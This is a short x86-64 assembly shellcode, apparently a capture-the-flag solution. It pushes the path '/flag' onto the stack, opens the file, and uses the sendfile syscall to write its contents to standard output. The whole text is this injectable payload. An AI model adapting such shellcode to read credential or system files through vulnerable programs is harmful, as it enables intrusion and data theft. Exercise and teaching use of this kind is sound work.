.global _start
_start:
.intel_syntax noprefix
mov ebx, 0x67616c66
shl rbx, 8
mov bl, 0x2f
push rbx
xor rax, rax
mov al, 2
mov rdi, rsp
xor rsi, rsi
syscall
xor rdi, rdi
mov dil, 1
mov rsi, rax
xor rdx, rdx
mov cl, 58
mov r10, rcx
mov al, 0x28
syscall
